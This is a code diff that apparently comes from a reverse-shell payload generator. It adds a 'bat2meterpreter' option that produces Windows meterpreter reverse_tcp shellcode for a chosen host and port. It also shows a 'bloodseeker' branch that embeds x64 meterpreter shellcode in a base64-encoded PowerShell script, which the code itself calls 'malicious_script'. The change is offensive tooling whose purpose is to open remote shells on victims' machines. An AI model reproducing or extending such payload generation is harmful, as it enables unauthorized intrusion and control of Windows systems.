@@ -1,6 +1,6 @@
 from encoders import powershell_base64, xor, to_unicode, to_urlencode
 from binascii import hexlify
-from binary import shellcode_to_ps1, WINDOWS_BLOODSEEKER_SCRIPT # imported since 0.3.6
+from binary import shellcode_to_hex, shellcode_to_ps1, WINDOWS_BLOODSEEKER_SCRIPT # imported since 0.3.6
 from sys import exit
 import platform
 import os
@@ -190,13 +190,17 @@ class ReverseShell(object):
             # Custom shell. Here we need to program individually based in specifics.
             # TODO: I need to separate this into a custom file.
 
-            if "bloodseeker" in self.name.lower(): # This is for Bloodseeker project.
+            if "bat2meterpreter" in self.name.lower():
+                print(info("Generating shellcode ..."))
+                return self.code + shellcode_to_hex("windows/meterpreter/reverse_tcp", self.args.host, self.args.port)
+
+            if "bloodseeker" in self.name.lower():  # This is for Bloodseeker project.
                 
                 # This one requires a stager.
                 if self.args.stager is None:
                     print(error("This payload REQUIRES --stager flag."))
                     exit(1)
-                
+
                 print(info("Generating shellcode ..."))
                 malicious_script = str(WINDOWS_BLOODSEEKER_SCRIPT.decode("base64")).replace("SHELLCODEHERE", shellcode_to_ps1("windows/x64/meterpreter/reverse_tcp", self.args.host, self.args.port))
 
